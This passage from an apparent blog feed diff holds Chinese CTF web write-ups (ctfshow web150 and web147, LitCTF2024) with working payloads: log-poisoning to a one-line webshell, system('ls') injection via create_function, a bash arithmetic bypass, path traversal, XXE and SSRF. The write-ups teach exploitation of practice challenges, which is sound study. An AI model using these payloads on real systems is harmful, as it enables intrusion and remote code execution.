punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;u=1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Te&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;trailers&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;keep-alive&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;45&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ctf=/var/log/nginx/access.log&amp;amp;1=system(&#39;ls&#39;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;通过变量覆盖使 isVIP=1，把一句话木马写在文件头中，然后包含日志文件，连接一句话木马&lt;/p&gt;
+</content>
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/categories/ctfshow/" />
+        <category term="web150" scheme="http://m3k0mi.github.io/categories/ctfshow/web150/" />
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/tags/ctfshow/" />
+        <updated>2024-06-05T10:31:46.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/06/01/LitCTF2024-wp/</id>
+        <title>LitCTF2024 wp</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/06/01/LitCTF2024-wp/"/>
+        <content type="html">&lt;h3 id=&#34;sas-serializing-authentication-system&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sas-serializing-authentication-system&#34;&gt;#&lt;/a&gt; SAS - Serializing Authentication System&lt;/h3&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;题目提示是一道反序列化题目，并且会将传入的数据 base64 解码&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;h3 id=&#34;一个池子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一个池子&#34;&gt;#&lt;/a&gt; 一个.... 池子？&lt;/h3&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;看界面是一个回声池，输入什么就输出什么。通过 wappalyzer 发现是用 flask 框架写的，想到 ssti。输入 {7*7} 返回 49，确定存在注入&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通用 payload 嗦了&lt;/p&gt;
+&lt;h3 id=&#34;百万美元的诱惑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#百万美元的诱惑&#34;&gt;#&lt;/a&gt; 百万美元的诱惑&lt;/h3&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;md5 用 0e 绕，c 用 2025a 绕&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;得到 /dollar.php&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;禁用了字母数字和一堆符号，但是没禁用～$ ()，提示 flag 在 12.php 中&lt;/p&gt;
+&lt;p&gt;$(()) 代表做一次运算，因为里面为空，所以值为 0&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;((~&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;mspace nobreak&#34;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;(()))) 对 0 取反，值为 - 1&lt;/p&gt;
+&lt;p&gt;因此 12 个&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;((~&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;mspace nobreak&#34;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;(()))) 值就为 - 12，再将其放到&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;((~&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;mspace nobreak&#34;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;(()))) 中取反，就可以得到数字 12&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?x=$(($((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;高亮主题划掉背景查看器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#高亮主题划掉背景查看器&#34;&gt;#&lt;/a&gt; 高亮主题 (划掉) 背景查看器&lt;/h3&gt;
+&lt;p&gt;抓包发现主题是通过文件包含来实现替换的&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;../ 回到根目录读取 flag 就好了&lt;/p&gt;
+&lt;h3 id=&#34;exx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exx&#34;&gt;#&lt;/a&gt; exx&lt;/h3&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这是一个登录界面，题目 exx 是 xxe 反写&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;xxe 注入成功&lt;/p&gt;
+&lt;h3 id=&#34;浏览器也能套娃&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#浏览器也能套娃&#34;&gt;#&lt;/a&gt; 浏览器也能套娃？&lt;/h3&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;里面也是一个类似浏览器的界面，猜测是 ssrf，用 file 协议读一下&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;/images/LitCtf2024/12.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;拿到 flag&lt;/p&gt;
+</content>
+        <category term="wp" scheme="http://m3k0mi.github.io/categories/wp/" />
+        <category term="LitCTF2024" scheme="http://m3k0mi.github.io/categories/wp/LitCTF2024/" />
+        <category term="wp" scheme="http://m3k0mi.github.io/tags/wp/" />
+        <updated>2024-06-01T03:57:32.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/27/php%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-web147/</id>
+        <title>php命名空间-web147</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/27/php%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-web147/"/>
+        <content type="html">&lt;h3 id=&#34;源码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码&#34;&gt;#&lt;/a&gt; 源码&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/*&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# -*- coding: utf-8 -*-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Author: h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Date:   2020-10-13 11:25:09&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified by:   h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified time: 2020-10-19 02:04:38&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;ctf&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$ctfshow&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;ctf&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/^[a-z0-9_]*$/isD&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ctfshow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$ctfshow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;show&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;正则部分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正则部分&#34;&gt;#&lt;/a&gt; 正则部分&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;/i：大小写不敏感匹配
+/s：点号元字符匹配所有字符，包含换行符。
+/D：元字符美元符号仅仅匹配目标字符串的末尾
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;正则匹配绕过，只要 ctfshow 里有一个不是数字、小写字母和下划线就能绕过。&lt;/p&gt;
+&lt;h3 id=&#34;命名空间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命名空间&#34;&gt;#&lt;/a&gt; 命名空间&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;create_function&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create_function&#34;&gt;#&lt;/a&gt; create_function&lt;/h3&gt;
+&lt;p&gt;引用这个函数时，做出了以下操作&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;获取参数，函数体；&lt;/li&gt;
+&lt;li&gt;拼凑一个”function __lambda_func (参数) { 函数体；} “的字符串；&lt;/li&gt;
+&lt;li&gt;eval;&lt;/li&gt;
+&lt;li&gt;通过__lambda_func 在函数表中找到 eval 后得到的函数体，找不到就出错；&lt;/li&gt;
+&lt;li&gt;定义一个函数名:”\000_lambda_” . count (anonymous_functions)++;&lt;/li&gt;
+&lt;li&gt;用新的函数名替换__lambda_func;&lt;/li&gt;
+&lt;li&gt;返回新的函数。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;php 中使用 create_function 创建匿名函数 (已弃用)，以下是借来的一个例子&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$q&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;echo&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;is&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$sy&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;create_function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;$a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$q&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;相当于这样创建&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;niming&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;is&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因此只要输入} 就能闭合这个函数，再用 /* 注释掉后面的}，由于这个函数执行了 eval，我们的输入就能被执行了&lt;/p&gt;
+&lt;h3 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload&lt;/h3&gt;
+&lt;p&gt;POST：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ctf=\create_function
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;GET：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;show=&amp;#125;system(&#39;ls&#39;);/*
+&lt;/code&gt;&lt;/pre&gt;
+</content>
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/categories/ctfshow/" />
+        <category term="web147" scheme="http://m3k0mi.github.io/categories/ctfshow/web147/" />
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/tags/ctfshow/" />
+        <updated>2024-05-27T10:40:34.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web145/</id>
+        <title>eval中的return-web145</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web145/"/>
+        <content type="html">&lt;h3 id=&#34;代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码&#34;&gt;#&lt;/a&gt; 代码&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/*&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# -*- coding: utf-8 